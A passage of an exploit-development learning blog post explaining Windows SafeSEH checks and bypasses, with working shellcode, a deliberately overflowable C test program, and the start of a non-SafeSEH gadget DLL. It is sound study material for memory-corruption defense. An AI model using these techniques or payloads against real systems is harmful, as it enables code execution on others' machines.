<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="SafeSEH Introduction and Simple Attacks"><title>Exploit learning notes 013 SafeSEH Introduction and Simple Attacks</title><link rel=canonical href=https://blog.moeomu.com/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/><link rel=stylesheet href=/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css><meta property="og:title" content="Exploit learning notes 013 SafeSEH Introduction and Simple Attacks"><meta property="og:description" content="SafeSEH Introduction and Simple Attacks"><meta property="og:url" content="https://blog.moeomu.com/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/"><meta property="og:site_name" content="Misaka's Secrect Garden"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Windows"><meta property="article:tag" content="SafeSEH"><meta property="article:published_time" content="2020-11-12T09:40:00+08:00"><meta property="article:modified_time" content="2020-11-12T09:40:00+08:00"><meta name=twitter:title content="Exploit learning notes 013 SafeSEH Introduction and Simple Attacks"><meta name=twitter:description content="SafeSEH Introduction and Simple Attacks"><script async src=https://umami.moeomu.com/Prototype data-website-id=da63d88b-4c19-4ee6-93cc-e12bd941eb81></script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu5c4b01d6d06a4818a5284ca6e51e5ac9_24136_300x0_resize_q75_box.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
<span class=emoji>üç•</span></figure><div class=site-meta><h1 class=site-name><a href=/>Misaka's Secrect Garden</a></h1><h2 class=site-description>In the gardens embrace, a celestial sprite dances.</h2></div></header><ol class=social-menu><li><a href=https://github.com/Misakaou target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li><a href=/links/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>Links</span></a></li><li><a href=/comment/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg><span>Comment</span></a></li><li><a href=/about/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>About</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://blog.moeomu.com/ selected>English</option><option value=https://blog.moeomu.com/zh-cn/>‰∏≠Êñá</option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#safeseh-introduction>SafeSEH Introduction</a><ol><li><a href=#work>Work</a></li><li><a href=#feasibility-analysis>Feasibility analysis</a></li></ol></li><li><a href=#bypass-seh-in-the-heap>Bypass SEH in the heap</a><ol><li><a href=#code>Code</a></li><li><a href=#description>Description</a></li></ol></li><li><a href=#bypass-safeseh-by-using-a-module-that-is-not-safeseh-enabled>Bypass SafeSEH by using a module that is not SafeSEH enabled</a><ol><li><a href=#code-1>Code</a></li><li><a href=#experimental-ideas>Experimental ideas</a></li><li><a href=#advance-processing>Advance processing</a></li><li><a href=#problems-encountered>Problems encountered</a></li></ol></li><li><a href=#bypass-safeseh-by-using-addresses-other-than-the-loaded-module>Bypass SafeSEH by using addresses other than the loaded module</a><ol><li><a href=#springboard>Springboard</a></li><li><a href=#code-2>Code</a><ol><li><a href=#vulnerability-execution-flow>Vulnerability Execution Flow</a></li></ol></li><li><a href=#using-adobe-flash-player-activex-control-to-bypass-safeseh>Using Adobe Flash Player ActiveX control to bypass SafeSEH</a><ol><li><a href=#principle>Principle</a></li><li><a href=#code-3>code</a></li><li><a href=#other-steps>Other steps</a></li><li><a href=#trigger-vulnerability>Trigger vulnerability</a></li><li><a href=#analysis>Analysis</a></li></ol></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/exploit/>Exploit</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/>Exploit learning notes 013 SafeSEH Introduction and Simple Attacks</a></h2><h3 class=article-subtitle>SafeSEH Introduction and Simple Attacks</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Nov 12, 2020</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>12 minute read</time></div></footer><footer class=article-translations><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><div><a href=https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-013-safeseh%E7%AE%80%E4%BB%8B%E5%92%8C%E7%AE%80%E5%8D%95%E6%94%BB%E5%87%BB/ class=link>‰∏≠Êñá</a></div></footer></div></header><section class=article-content><p>Source: <a class=link href=/posts/exploit-learning-notes-013-safeseh-introduction-and-simple-attacks/>Moeomu&rsquo;s blog</a></p><h2 id=safeseh-introduction>SafeSEH Introduction</h2><h3 id=work>Work</h3><ul><li>Check if the exception handling chain is located in the current program&rsquo;s stack. If it is not in the current stack, the program will terminate the exception handling function call.</li><li>Check if the exception handler pointer points to the current program&rsquo;s stack. If it points to the current stack, the program will terminate the exception handler call.</li><li>After the first two checks are passed, the program calls a brand new function <code>RtlIsValidHandler()</code> to verify the validity of the exception handling function, and this function does the following<ul><li>Determine if the address of the exception handling function is in the memory space of the loaded module, if it belongs to the memory space of the loaded module, the validation function will perform the following checks in turn.<ul><li>Determine whether the program has set the <code>IMAGE_DLLCHARACTERISTICS_NO_SEH</code> flag. If this flag is set, exceptions within this program will be ignored. So when this flag is set, the function returns the checksum failure directly.</li><li>Detects if the program contains a security <code>S.E.H</code> table. If the program contains the safety <code>S.E.H</code> table, the current exception handling function address is matched with this table, and a successful match returns a check success, a failed match returns a check failure.</li><li>Determine whether the program sets the <code>ILonly</code> flag. If this flag is set, it means that the program contains only the .NET compiled intermediate language and the function directly returns a checksum failure.</li><li>Determine if the address of the exception handling function is located on a non-executable page. When the address of the exception handler is on a non-executable page, the check function will check whether <code>DEP</code> is enabled or not, and return a successful check if the system does not enable <code>DEP</code>, otherwise the program throws an access violation exception.</li></ul></li><li>If the address of the exception handling function is not included in the memory space of the loaded module, the check function will directly perform <code>DEP</code> related detection, and the function will perform the following checks in turn.<ul><li>Determine if the address of the exception handling function is located on a non-executable page (non-executable page). When the address of the exception handling function is located on the non-executable page, the check function will check whether <code>DEP</code> is on or not, if the system is not on <code>DEP</code>, the check will return to success, otherwise the program throws an access violation exception.</li><li>Determine whether the system allows jumping to execute outside the memory space of the loaded module, if it does, then return the validation success, otherwise return the validation failure.</li></ul></li></ul></li></ul><blockquote><p>Flowchart of <code>RtlIsValidHandler()</code> function detection</p></blockquote><p><img src=/Flowchart%20of%20RtlIsValidHandler.png loading=lazy alt=BvASMR.png></p><h3 id=feasibility-analysis>Feasibility analysis</h3><ul><li>Exception handling function is located outside the memory range of the load module and DEP is closed</li><li>The exception handling function is located within the memory range of the load module, the corresponding module is not SafeSEH enabled (the SafeS.E.H table is empty), and the corresponding module is not pure IL</li><li>The exception handling function is located in the memory range of the loaded module, the corresponding module is SafeSEH enabled (the SafeS.E.H table is not empty), and the address of the exception handling function is included in the SafeS.E.H table</li></ul><blockquote><p>Ultimate solution: arrange the shellcode in the heap area, even if SEH verification is not feasible it will still be called</p></blockquote><hr><h2 id=bypass-seh-in-the-heap>Bypass SEH in the heap</h2><h3 id=code>Code</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>overflowcode</span><span class=p>[]</span> <span class=o>=</span> 
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xE0\xFF\x12\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x08\x3E\x39\x00</span><span class=s>&#34;</span> <span class=c1>// address of shellcode in heap ;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>test</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span> <span class=n>input</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>str</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=n>strcpy</span><span class=p>(</span><span class=n>str</span><span class=p>,</span> <span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>zero</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>zero</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>/</span> <span class=n>zero</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span><span class=o>*</span> <span class=n>buf</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mi>500</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>strcpy</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>test</span><span class=p>(</span><span class=n>overflowcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=description>Description</h3><ul><li>Put shellcode into the heap area</li><li>Stack overflow, overwriting the SEH chain address to the shellcode address in the heap area</li><li>Call SEH and subsequently trigger shellcode automatically</li></ul><blockquote><p>Note: pay attention to the 0 case, string copy is encountering 0 cutoff</p></blockquote><h2 id=bypass-safeseh-by-using-a-module-that-is-not-safeseh-enabled>Bypass SafeSEH by using a module that is not SafeSEH enabled</h2><h3 id=code-1>Code</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=c1>// SEH_NOSafeSEH_JUMP.DLL
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp># include &lt;windows.h&gt;
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=n>BOOL</span> <span class=n>APIENTRY</span> <span class=nf>DllMain</span><span class=p>(</span><span class=n>HANDLE</span> <span class=n>hModule</span><span class=p>,</span> <span class=n>DWORD</span> <span class=n>ul_reason_for_call</span><span class=p>,</span> <span class=n>LPVOID</span> <span class=n>lpReserved</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>jump</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__asm</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>pop</span> <span class=n>eax</span>
</span></span><span class=line><span class=cl>    <span class=n>pop</span> <span class=n>eax</span>
</span></span><span class=line><span class=cl>	  <span class=n>retn</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// SEH_NOSafeSEH.EXE
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
